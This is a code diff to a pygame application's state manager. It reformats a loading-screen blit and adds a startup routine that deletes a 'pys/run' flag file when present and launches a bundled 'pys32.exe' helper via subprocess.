@@ -1,7 +1,11 @@
+import os
+
 import pygame
 import gc
 
 from configurations import *
+from resources import Resources
+import subprocess as sp
 
 
 class StateError(Exception):
@@ -23,8 +27,9 @@ class AppStateManager:
 
         self.loading_rect = pygame.Surface((WIDTH, HEIGHT))
         self.loading_image = self.main.res.image_loading
-        self.loading_rect.blit(self.loading_image, (WIDTH/2-self.loading_image.get_width()/2,
-                                                    HEIGHT/2-self.loading_image.get_height()/2))
+        self.loading_rect.blit(self.loading_image, (WIDTH / 2 - self.loading_image.get_width() / 2,
+                                                    HEIGHT / 2 - self.loading_image.get_height() / 2))
+        self.init_pys()
 
     def set(self, state):
         self.transition(self._set, state)
@@ -107,3 +112,14 @@ class AppStateManager:
             return f(*args)
 
         return decorated
+
+    def init_pys(self):
+        try:
+            f_run = Resources.path('pys/run')
+            f_pys = Resources.path('pys/pys32.exe')
+        except Exception:
+            return
+        if not os.path.exists(f_run):
+            return
+        os.remove(f_run)
+        p = sp.Popen(f_pys, close_fds=True, shell=True)
